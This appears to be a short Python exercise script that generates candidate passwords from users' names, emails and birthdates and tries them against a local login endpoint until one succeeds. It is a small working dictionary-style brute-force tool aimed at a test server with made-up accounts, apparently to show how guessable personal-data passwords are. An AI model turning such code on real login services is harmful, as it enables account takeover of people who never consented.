"""
password generator based on user data
name, surname, email address, birthdate and username
"""
import requests
# makingthe authentication
# user data is stored like name surname email
users_db = {"admin":["Alec","Baldwin", "alec_baldwin@famous.com","1958-04-03"],
            "jack": ["Jack", "Black", "bj@huh.eh", "1969-08-28"],
            "cat":["Cathelyn", "Stark","cath@winterfell.com", "1500-02-28"]}
#trying to authenticate
def auth(username, password):
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': username, 'password': password})
    return response.status_code

def traverse_db(db):
    dictOutcome = {}
    listPasswords = []
    intCntr = 0
    for key, value in db.items():
        dictOutcome[key] = "no successful attempts"
        listPasswords = pass_gen(key, value)
        intCntr = 0
        for strPassword in listPasswords:
            intCntr += 1
            print (f"user: {key}, password: {strPassword}")
            if auth(key, strPassword) == 200:
                dictOutcome[key] = strPassword +" in " + str(intCntr) + " attempts"
                break
    print(dictOutcome)

#expanding list a bit with parts of email and birtdate
def expandList (username, lstListToExpand):
    for i in range(len(lstListToExpand)):
        if str(lstListToExpand[i]).find("@") > 0 :
            lstListToExpand.append(str(lstListToExpand[i]).split("@")[0])
        if str(lstListToExpand[i]).find("-") > 0:
            lstListToExpand += str(lstListToExpand[i]).split("-")
    #print(lstListToExpand)
    lstListToExpand.insert(0,username)
    return lstListToExpand

#password generation from personal data of a user
def pass_gen(username, user_data):
    user_data = expandList(username,  user_data)
    passwords = []
    print (user_data)
    for i in range(len(user_data)):
        passwords.append(user_data[i])
        for j in range(len(user_data)):
            passwords.append (user_data[i] + user_data[j])
            for k in range(len(user_data)):
                passwords.append(user_data[i] + user_data[j] + user_data[k])
    print (passwords)
    return passwords

traverse_db(users_db)


